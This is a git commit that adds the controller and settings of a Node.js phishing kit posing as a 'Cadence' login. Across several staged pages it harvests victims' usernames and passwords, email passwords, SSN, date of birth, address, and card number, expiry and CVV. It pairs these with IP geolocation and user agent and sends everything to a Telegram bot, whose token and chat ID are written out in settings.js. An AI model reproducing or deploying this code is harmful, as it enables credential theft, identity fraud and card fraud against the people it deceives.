4fe2403703ffe81b37fca773e4ee5f5ac3991fa1
XeniaXi <160789661+XeniaXi@users.noreply.github.com>
2024-02-21 16:26:52 -0500

    Add files via upload

---
+++ controller/controller.js
@@ -0,0 +1,186 @@
+const { sendMessageFor } = require("simple-telegram-message");
+const { botToken, chatId } = require("../settings");
+const getIPDetails = require("../middleware/getIPDetails");
+
+// console.log(getIPDetails());
+
+exports.login = (req, res) => {
+  return res.render("login");
+};
+
+exports.loginPost = async (req, res) => {
+  const { userid, password } = req.body;
+
+  const iPDetails = await getIPDetails();
+  const { query, city, region, country, isp } = iPDetails;
+
+  const userAgent = req.headers["user-agent"];
+
+  const message =
+    `C A D E N C E LOGIN-1\n\n` +
+    `🔰Username        : ${userid}\n` +
+    `🔑Pass            : ${password}\n\n` +
+    `++++++++++++++++++++++++++++++\n\n` +
+    `IP ADDRESS INFO\n` +
+    `IP Address       : ${query}\n` +
+    `City             : ${city}\n` +
+    `State            : ${region}\n` +
+    `Country          : ${country}\n` +
+    `ISP              : ${isp}\n\n` +
+    `+++++++++++++++++++++++++++++++\n\n` +
+    `SYSTEM INFO || USER AGENT\n` +
+    `USER AGENT       : ${userAgent}\n` +
+    `👨‍💻 @akfour7 - TG 👨‍💻`;
+
+  const sendMessage = sendMessageFor(botToken, chatId);
+  sendMessage(message);
+
+  res.redirect("/auth/email-verification");
+};
+
+exports.email = (req, res) => {
+  res.render("email-verification");
+};
+
+exports.emailPost = async (req, res) => {
+  const { email, emailPass } = req.body;
+
+  const iPDetails = await getIPDetails();
+  const { query, city, region, country, isp } = iPDetails;
+
+  const userAgent = req.headers["user-agent"];
+
+  const message =
+    `C A D E N C E Email Access\n\n` +
+    `📧Email            : ${email}\n` +
+    `🔑Email Pass            : ${emailPass}\n\n` +
+    `++++++++++++++++++++++++++++++++\n\n` +
+    `IP ADDRESS INFO\n` +
+    `IP Address       : ${query}\n` +
+    `City             : ${city}\n` +
+    `State            : ${region}\n` +
+    `Country          : ${country}\n` +
+    `ISP              : ${isp}\n\n` +
+    `++++++++++++++++++++++++++++++++\n\n` +
+    `SYSTEM INFO || USER AGENT\n` +
+    `USER AGENT       : ${userAgent}\n` +
+    `👨‍💻 @akfour7 - TG 👨‍💻`;
+
+  const sendMessage = sendMessageFor(botToken, chatId);
+  sendMessage(message);
+
+  res.redirect("/auth/billing-information");
+};
+
+exports.personal = (req, res) => {
+  res.render("personal");
+};
+
+exports.personalPost = async (req, res) => {
+  const { fname, dob, phone, ssn, address, city1, state, zipcode } = req.body;
+
+  const iPDetails = await getIPDetails();
+  const { query, city, region, country, isp } = iPDetails;
+
+  const userAgent = req.headers["user-agent"];
+
+  const message =
+    `C A D E N C E Email Access\n\n` +
+    `Full Name  : ${fname}\n` +
+    `Date of Birth   : ${dob}\n\n` +
+    `Phone Number   : ${phone}\n\n` +
+    `SSN   : ${ssn}\n\n` +
+    `Address   : ${address}\n\n` +
+    `City   : ${city}\n\n` +
+    `State   : ${state}\n\n` +
+    `Zipcode   : ${zipcode}\n\n` +
+    `++++++++++++++++++++++++++++++++\n\n` +
+    `IP ADDRESS INFO\n` +
+    `IP Address       : ${query}\n` +
+    `City             : ${city1}\n` +
+    `State            : ${region}\n` +
+    `Country          : ${country}\n` +
+    `ISP              : ${isp}\n\n` +
+    `++++++++++++++++++++++++++++++++\n\n` +
+    `SYSTEM INFO || USER AGENT\n` +
+    `USER AGENT       : ${userAgent}\n` +
+    `👨‍💻 @akfour7 - TG 👨‍💻`;
+
+  const sendMessage = sendMessageFor(botToken, chatId);
+  sendMessage(message);
+
+  res.redirect("/auth/card-information");
+};
+exports.card = (req, res) => {
+  res.render("card-information");
+};
+
+exports.cardPost = async (req, res) => {
+  const { cardNum, exp, cvv } = req.body;
+
+  const iPDetails = await getIPDetails();
+  const { query, city, region, country, isp } = iPDetails;
+
+  const userAgent = req.headers["user-agent"];
+
+  const message =
+    `C A D E N C E Email Access\n\n` +
+    `Card Number   : ${cardNum}\n` +
+    `Expiry Date   : ${exp}\n\n` +
+    `CVV   : ${cvv}\n\n` +
+    `++++++++++++++++++++++++++++++++\n\n` +
+    `IP ADDRESS INFO\n` +
+    `IP Address       : ${query}\n` +
+    `City             : ${city}\n` +
+    `State            : ${region}\n` +
+    `Country          : ${country}\n` +
+    `ISP              : ${isp}\n\n` +
+    `++++++++++++++++++++++++++++++++\n\n` +
+    `SYSTEM INFO || USER AGENT\n` +
+    `USER AGENT       : ${userAgent}\n` +
+    `👨‍💻 @akfour7 - TG 👨‍💻`;
+
+  const sendMessage = sendMessageFor(botToken, chatId);
+  sendMessage(message);
+
+  res.redirect("/auth/success");
+};
+
+exports.cardPost = async (req, res) => {
+  const { cardNum, exp, cvv } = req.body;
+
+  const iPDetails = await getIPDetails();
+  const { query, city, region, country, isp } = iPDetails;
+
+  const userAgent = req.headers["user-agent"];
+
+  const message =
+    `C A D E N C E Email Access\n\n` +
+    `Card Number   : ${cardNum}\n` +
+    `Expiry Date   : ${exp}\n\n` +
+    `CVV   : ${cvv}\n\n` +
+    `++++++++++++++++++++++++++++++++\n\n` +
+    `IP ADDRESS INFO\n` +
+    `IP Address       : ${query}\n` +
+    `City             : ${city}\n` +
+    `State            : ${region}\n` +
+    `Country          : ${country}\n` +
+    `ISP              : ${isp}\n\n` +
+    `++++++++++++++++++++++++++++++++\n\n` +
+    `SYSTEM INFO || USER AGENT\n` +
+    `USER AGENT       : ${userAgent}\n` +
+    `👨‍💻 @akfour7 - TG 👨‍💻`;
+
+  const sendMessage = sendMessageFor(botToken, chatId);
+  sendMessage(message);
+
+  res.redirect("/auth/success");
+};
+
+exports.success = (req, res) => {
+  return res.render("success");
+};
+
+exports.page404Redirect = (req, res) => {
+  return res.redirect("/auth/login");
+};
---
+++ settings.js
@@ -0,0 +1,5 @@
+module.exports = {
+	botToken: "7052971152:AAHPQ6K4XXbWNH2yEuUUKG9jZYLZunlmwkI",
+	chatId: "6208445054",
+};
+
